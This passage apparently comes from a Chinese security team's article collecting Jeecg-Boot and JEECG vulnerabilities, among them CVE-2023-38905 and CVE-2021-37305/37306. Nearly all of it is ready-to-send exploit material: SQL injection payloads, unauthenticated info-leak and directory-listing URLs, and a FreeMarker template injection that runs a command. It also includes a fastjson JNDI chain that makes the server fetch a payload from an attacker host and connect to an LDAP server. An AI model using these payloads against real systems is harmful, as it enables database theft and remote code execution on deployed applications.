User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Content-Length: 182
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip

{
"id": "961455b47c0b86dc961e90b5893bff05",
"apiUrl": "",
"params": {
    "id ": "1 ' or ' % 1 % ' like (updatexml(0x3a,concat(1,(version())),1)) or ' % % ' like '"
  }
}


```

  

jeecg-boot sys/duplicate/check SQL 注入（CVE-2023-38905）
-----------------------------------------------------

### 漏洞简介

/sys/duplicate/check 接口 SQL 注入，checksql 可以被绕过，该漏洞需要进行身份认证。

### 漏洞复现

```
GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Connection: close
Cache-Control: max-age=0
X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU


```

另一个 payload：

```
GET /jeecg-boot/sys/duplicate/check?tableName=sys_log&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(10))&fieldVal=1000&dataId=2000 


```

  

jeecg-boot-checkOnlyUser 信息泄露漏洞 （ CVE-2021-37306）
-------------------------------------------------

### 漏洞简介

Jeecg-Boot 2.4.5 及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过 uri:/sys/user/checkOnlyUser?username=admin 提升权限并查看敏感信息。

### 漏洞复现

```
/jeecg-boot/sys/user/querySysUser?username=admin


```

  

jeecg-boot-querySysUser 信息泄露漏洞 (CVE-2021-37305)
-----------------------------------------------

### 漏洞简介

Jeecg-Boot 2.4.5 及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过 uri: /sys/user/querySysUser?username=admin 提升权限并查看敏感信息。

### 漏洞复现

```
/jeecg-boot/sys/user/querySysUser?username=admin


```

  

jeecg-boot - 目录遍历漏洞
-------------------

### 漏洞简介

低权限账号访问

```
http://localhost:8080/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/


```

直接返回服务器文件目录信息

### 漏洞复现

  

jeecg-boot 后台 / sysMessageTemplate/sendMsg 接口 freemaker 模板注入
------------------------------------------------------------

### 漏洞描述

Freemarker 模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。漏洞危害等级：高危

### 漏洞复现

1、添加一个测试模板

```
POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 141

{"templateType":"1","templateCode":"5","templateName":"test111","templateContent":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}"}


```

2、发送模板

```
POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 64

{"templateCode":"5","testData":"{}","receiver":"","msgType":"1"}


```

3、执行模板并查看返回结果

```
GET /jeecg-boot/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Accept-Encoding: gzip


```

  

Jeecg-jeecgFormDemoController 存在 JNDI 代码执行漏洞
--------------------------------------------

### 漏洞简介

JEECG 4.0 及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ../ 的 url 绕过鉴权。 因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对 /api/../jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行

### 漏洞 poc

```
POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET


```

创建如下远程文件，其内容为 fastjson 代码执行的 payload

```
        {
            "a":{
                "@type":"java.lang.Class",
                "val":"com.sun.rowset.JdbcRowSetImpl"
            },
            "b":{
                "@type":"com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName":"ldap://10.66.64.89:1389/8orsiq",
                "autoCommit":true
            }
        }


```




=======================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================




===================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================

往期推荐

[TscanPlus - 一款红队自动化工具](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247516589&idx=1&sn=107da3b45e88255f240504d033ebde7f&chksm=ce5da3ccf92a2adab0511bd798570d967cd4b0b7d7528f2f17163f5ed77e4dd7a02ac17c39d7&scene=21#wechat_redirect)  

[潮影在线免杀平台上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499902&idx=1&sn=59cba8d980b4ecb0deefff99edaabd4d&chksm=ce5de21ff92a6b09a8972a0144557b0099e443aa8e018b17151c816fc7f08f3615ecb22617fc&scene=21#wechat_redirect)  

[自动化渗透测试工具开发实践](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498466&idx=1&sn=085c15679436dedb06a179ca8d47951a&chksm=ce5dd883f92a5195ef74ac517741f6d3da0da40b5501d72016e52cb70344904bb85b8aef65ba&scene=21#wechat_redirect)  

[【红蓝对抗】利用 CS 进行内网横向](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492640&idx=1&sn=43b1991dc5628eab322923083fde8d70&chksm=ce5dc641f92a4f57ffb18e2977644b1f977fcc5e0eccdf10956d3ae4ce70dc95024500631e89&scene=21#wechat_redirect)  

[一个 Go 版 (更强大) 的 TideFinger](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498344&idx=1&sn=3679330363ff6890166b09f6a502f769&chksm=ce5dd809f92a511f6066fcbb12fb5c1dc8c2642e4e2690dad64d76cc6f9247eae356d16f5810&scene=21#wechat_redirect)  

[SRC 资产导航监测平台 Tsrc 上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499823&idx=1&sn=065ffeae6bd02fff922cfb12c5a0f4df&chksm=ce5de24ef92a6b58f709260b691e6b36e4a53aac00d3022946302b8e638696ed55c70e13e16f&scene=21#wechat_redirect)

[新潮信息 - Tide 安全团队 2022 年度总结](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247506056&idx=1&sn=ad6dd23f58f5fd8ce899a1e292f5b685&chksm=ce5dfae9f92a73ff4f14c812436cb5bfecb29db04eada11c409e946d5338c82a92bcaa425736&scene=21#wechat_redirect)

[记一次实战攻防 (打点 - Edr - 内网 - 横向 - Vcenter)](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498965&idx=1&sn=655548831da6808a020ad07294a92e60&chksm=ce5ddeb4f92a57a283d5692c246e54655319ab0d09f6403e354300a2777cda6ae4c787631ab3&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif#imgIndex=2)

E

N

D

  

**Tide 团队产品及服务**

**团队自研平台**：潮汐在线指纹识别平台 | 潮听漏洞情报平台 | 潮巡资产管理与威胁监测平台 | 潮汐网络空间资产测绘 | 潮声漏洞检测平台 | 在线免杀平台 | CTF 练习平台 | 物联网固件检测平台 | SRC 资产监控平台  | ......

**技术分享方向**:Web 安全 | 红蓝对抗 | 移动安全 | 应急响应 | 工控安全 | 物联网安全 | 密码学 | 人工智能 | ctf 等方面的沟通及分享

**团队知识 wiki**：红蓝对抗 | 漏洞武器库 | 远控免杀 | 移动安全 | 物联网安全 | 代码审计 | CTF | 工控安全 | 应急响应 | 人工智能 | 密码学 | CobaltStrike | 安全测试用例 | ......

**团队网盘资料**：安全法律法规 | 安全认证资料 | 代码审计 | 渗透安全工具 | 工控安全工具 | 移动安全工具 | 物联网安全 | 其它安全文库合辑  | ......

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
